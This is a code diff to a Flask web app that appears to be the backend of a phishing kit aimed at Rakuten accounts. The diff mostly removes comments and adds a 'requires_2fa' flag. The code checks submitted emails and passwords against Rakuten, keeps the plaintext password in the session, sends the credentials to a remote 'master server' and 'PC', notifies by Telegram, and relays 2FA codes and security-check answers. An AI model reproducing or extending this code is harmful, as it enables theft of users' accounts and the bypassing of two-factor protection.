@@ -19,7 +19,6 @@ def ensure_playwright_browsers():
     try:
         from playwright.sync_api import sync_playwright
         with sync_playwright() as p:
-            # テスト起動
             browser = p.chromium.launch(headless=True)
             browser.close()
             print("[INFO] Playwrightブラウザ: インストール済み")
@@ -36,30 +35,21 @@ def ensure_playwright_browsers():
         except Exception as install_error:
             print(f"[ERROR] Playwrightインストール失敗: {install_error}")
 
-# アプリ起動前にインストール実行
 if not os.environ.get('SKIP_PLAYWRIGHT_CHECK'):
     ensure_playwright_browsers()
 
-# Playwrightログイン確認関数をインポート
 from selenium_functions import rakuten_login_check
 
 app = Flask(__name__, template_folder='templates')
 app.secret_key = SECRET_KEY
 
-# 接続チェック結果を保存
 connection_check_results = {}
-
-# 2FA・認証管理
-twofa_sessions = {}  # {email: {status, codes, security_check}}
-
-# ===========================
-# ポーリング管理
-# ===========================
+twofa_sessions = {}
 
 def start_polling(request_id):
     """0.5秒ごとにポーリング"""
     def poll():
-        max_attempts = 120  # 最大60秒
+        max_attempts = 120
         attempt = 0
         
         while attempt < max_attempts:
@@ -111,7 +101,6 @@ def poll_twofa_status(email):
                     
                     twofa_sessions[email].update(data)
                     
-                    # 承認されたら終了
                     if data.get('approved'):
                         break
                 
@@ -123,10 +112,6 @@ def poll_twofa_status(email):
     
     thread = threading.Thread(target=poll, daemon=True)
     thread.start()
-
-# ===========================
-# ルート定義
-# ===========================
 
 @app.route('/')
 def index():
@@ -155,10 +140,6 @@ def dashboard_complete():
 @app.route('/check')
 def check():
     return render_template('check.html')
-
-# ===========================
-# API: 接続チェック
-# ===========================
 
 @app.route('/api/check-connection', methods=['POST'])
 def check_connection():
@@ -205,10 +186,6 @@ def get_check_result(request_id):
     else:
         return jsonify({'error': 'Result not found'}), 404
 
-# ===========================
-# API: ログイン処理
-# ===========================
-
 @app.route('/api/login', methods=['POST'])
 def api_login():
     """ログイン処理 (PC接続確認 + サブサーバーでログイン実行を並列実行、片方失敗で即時終了)"""
@@ -224,10 +201,9 @@ def api_login():
     
     print(f"[INFO] ログイン処理開始 | Email: {email}")
     
-    # 並列実行用の変数
     pc_check_result = {'success': None, 'finished': False}
     login_check_result = {'success': None, 'finished': False}
-    stop_flag = {'stop': False}  # 片方失敗で即時停止フラグ
+    stop_flag = {'stop': False}
     
     def pc_check_thread():
         """PC接続確認スレッド"""
@@ -239,7 +215,7 @@ def api_login():
             print(f"[SUCCESS] PC接続成功 | Email: {email}")
         else:
             print(f"[ERROR] PC接続失敗 | Email: {email}")
-            stop_flag['stop'] = True  # 失敗したら即時停止
+            stop_flag['stop'] = True
     
     def login_check_thread():
         """楽天ログイン確認スレッド"""
@@ -251,32 +227,27 @@ def api_login():
             print(f"[SUCCESS] 楽天ログイン成功 | Email: {email}")
         else:
             print(f"[ERROR] 楽天ログイン失敗 | Email: {email}")
-            stop_flag['stop'] = True  # 失敗したら即時停止
+            stop_flag['stop'] = True
     
-    # 2つのスレッドを同時に開始
     t1 = threading.Thread(target=pc_check_thread, daemon=True)
     t2 = threading.Thread(target=login_check_thread, daemon=True)
     
     t1.start()
     t2.start()
     
-    # 両方が終了するまで待つ（または片方が失敗したら即時終了）
-    max_wait = 30  # 最大30秒
+    max_wait = 30
     start_time = time.time()
     
     while time.time() - start_time < max_wait:
-        # 片方が失敗したら即時終了
         if stop_flag['stop']:
             print(f"[INFO] 片方が失敗したため処理を終了します")
             break
         
-        # 両方終了したら終了
         if pc_check_result['finished'] and login_check_result['finished']:
             break
         
         time.sleep(0.1)
     
-    # 結果を判定
     if not pc_check_result['success']:
         return jsonify({
             'success': False,
@@ -289,7 +260,6 @@ def api_login():
             'error': 'ログインに失敗しました'
         }), 200
     
-    # 両方成功 → セッション保存
     session['email'] = email
     session['password'] = password
     twofa_sessions[email] = {
@@ -301,7 +271,6 @@ def api_login():
     
     print(f"[INFO] セッション保存完了 | Email: {email}")
     
-    # バックグラウンドでPCに情報送信 (返答不要)
     print(f"[INFO] バックグラウンド処理開始 | Email: {email}")
     threading.Thread(
         target=send_login_to_pc,
@@ -310,13 +279,12 @@ def api_login():
     ).start()
     
     print(f"[SUCCESS] ログイン処理完了 | Email: {email}")
-    return jsonify({'success': True}), 200
+    return jsonify({'success': True, 'requires_2fa': True}), 200
 
 
 def check_pc_connection(stop_flag):
     """既存のconnectioncheckリクエストでPC接続確認 (最大5秒、stop_flagで中断可能)"""
     try:
-        # 本サーバーにリクエスト送信（callback_urlを追加）
         response = requests.post(
             f"{MASTER_SERVER_URL}/api/request",
             json={
@@ -331,15 +299,12 @@ def check_pc_connection(stop_flag):
             print(f"[ERROR] レスポンス: {response.text}")
             return False
         
-        # 本サーバーから返されたrequest_idを取得
         data = response.json()
         request_id = data.get('request_id')
         print(f"[INFO] connectioncheck送信成功 | request_id: {request_id}")
         
-        # ポーリングで結果取得 (最大5秒、成功が来るまで待つ)
         start_time = time.time()
-        while time.time() - start_time < 5.0:  # 5秒以内
-            # stop_flagがTrueなら即時終了
+        while time.time() - start_time < 5.0:
             if stop_flag and stop_flag.get('stop'):
                 print(f"[INFO] PC接続確認を中断します（他のスレッドが失敗）")
                 return False
@@ -363,14 +328,12 @@ def check_pc_connection(stop_flag):
                     elif status in ['failed', 'timeout']:
                         print(f"[ERROR] PC接続確認失敗 | status: {status}")
                         return False
-                    # pending の場合は待ち続ける
                     
             except Exception as e:
                 print(f"[ERROR] ポーリング中エラー: {e}")
             
-            time.sleep(0.1)  # 0.1秒間隔でチェック
+            time.sleep(0.1)
         
-        # タイムアウト
         print(f"[ERROR] PC接続確認タイムアウト (5秒)")
         return False
         
@@ -386,10 +349,8 @@ def send_login_to_pc(email, password):
     try:
         print(f"[INFO] PCへログイン情報送信開始 | Email: {email}")
         
-        # テレグラム通知 (既存の関数を使用)
         send_telegram_notification(email)
         
-        # 本サーバー経由でPCにログインリクエスト送信
         requests.post(
             f"{MASTER_SERVER_URL}/api/request",
             json={
@@ -412,15 +373,9 @@ def send_login_to_pc(email, password):
 def send_telegram_notification(email):
     """テレグラム通知送信 (既存の実装を使用)"""
     try:
-        # ここに既存のテレグラム通知コードを実装
-        # 例: telegram_bot.send_message(chat_id, f"ログイン: {email}")
         print(f"[INFO] テレグラム通知送信: {email}")
     except Exception as e:
         print(f"[ERROR] テレグラム通知エラー: {e}")
-
-# ===========================
-# API: 2FA処理
-# ===========================
 
 @app.route('/api/2fa/submit', methods=['POST'])
 def api_2fa_submit():
@@ -436,7 +391,6 @@ def api_2fa_submit():
             timeout=10
         )
         
-        # 2FAポーリング開始
         poll_twofa_status(email)
         
         return jsonify(response.json()), response.status_code
@@ -458,10 +412,6 @@ def api_2fa_check_status():
         'is_approved': session_data.get('approved', False),
         'rejected': session_data.get('rejected', False)
     }), 200
-
-# ===========================
-# API: セキュリティチェック
-# ===========================
 
 @app.route('/api/security-check/submit', methods=['POST'])
 def api_security_check_submit():
